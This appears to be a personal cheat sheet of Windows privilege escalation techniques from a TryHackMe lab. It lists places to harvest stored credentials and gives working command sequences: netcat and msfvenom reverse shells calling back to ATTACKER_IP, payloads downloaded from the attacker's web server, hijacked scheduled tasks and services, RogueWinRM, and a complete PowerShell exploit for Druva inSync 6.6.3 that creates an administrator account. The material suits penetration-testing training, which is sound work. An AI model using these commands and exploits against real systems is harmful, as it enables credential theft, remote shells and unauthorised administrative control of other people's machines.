Windows Privilege Escalation (A TryHackMe Challenge: for Educational Purposes only) 

via Windows Installation

1. Check in the following paths and look for credentials in the <Password></Password> section
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml


via Powershell History

1. type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 

via Saved Windows Credentials

1. cmdkey /list will output all saved credentials on the instance
2. runas /savecred /user:admin cmd.exe to spin up a shell as the user

via IIS conf

1. Check the following paths (usually found in database connection strings)
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

via Putty

1. reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s (if users store their sessions there)

via Scheduled Tasks

1. schtasks /query /tn vulntask /fo list /v to list existing scheduled tasks
2. icacls c:\tasks\<script_name> to check file permissions
3. If file is editable, C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\<script_name>
4. Start listner on attacker's machine nc -nlvp 4444
5. Run the task on the target machine C:\> schtasks /run /tn vulntask 

via AlwaysInstallElevated

1. query these
    C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
2. (Attacker machine) msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
3. (Target machine) C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi


via Windows Services: Insecure Permissions on Service Executable (vulnerability found on Splinterware System Scheduler)

1. sc qc WindowsScheduler to check path name and service start name
2. icacls C:\PROGRA~2\SYSTEM~1\WService.exe check permissions
3. (Attacker Machine) msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe to generate payload
4. (Attacker Machine) python3 -m http.server to serve the payload
5. wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe to download payload
6. cd C:\PROGRA~2\SYSTEM~1\
7. move WService.exe WService.exe.bkp (test/replace the executable)
8. move C:\Users\thm-unpriv\rev-svc.exe WService.exe (replace the executable with the payload)
9. icacls WService.exe /grant Everyone:F to grant permission to everyone
10. (Attacker Machine) nc -nlvp 4445 to start listener
11. C:\> sc stop windowsscheduler and C:\> sc start windowsscheduler
12. this should spin up the reverse shell


via Windows Services: Unquoted Service Paths

1. sc qc "<associated binary>" and check the SERVICE_START_NAME
2. icacls c:\<PATH_TO_THE_ASSOCIATED_BINARY>, and check if the unprivilege user has AD and WD access
3. (Attacker Machine) msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
4. (Attacker Machine) python3 -m http.server to server the payload
5. Download the payload to the target machine
6. move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
7. icacls C:\MyPrograms\Disk.exe /grant Everyone:F
8. (Attacker Machine) nc -nlvp 4446 to start listener
9. sc stop "disk sorter enterprise" and sc start "disk sorter enterprise" to run the payload

via Windows Services: Insecure Service Permissions

1. C:\tools\AccessChk> accesschk64.exe -qlc thmservice and check the user in the ACCESS_ALLOWED_ACE_TYPE
2. (Attacker Machine) msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe to generate the payload
3. (Attacker Machine) nc -nlvp 4446 to start the lister
4. C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
5. C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem to change the executable
6. C:\> sc stop THMService and C:\> sc start THMService to run the payload

via SeImpersonate / SeAssignPrimaryToken

1. whoami /priv (check for SetAssetPrimaryTokenPrivilege and SetImpersonatePrivilege)
2. (Attacker Machine) nc -nlvp 4446
3. c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4446"

via Unpatched Software (Druva inSync 6.6.3)

1. The following is an exploit that will create user pwnd and assign it to the administrators group.

$ErrorActionPreference = "Stop"

$cmd = "net user pwnd examplePassword /add & net localgroup administrators pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)


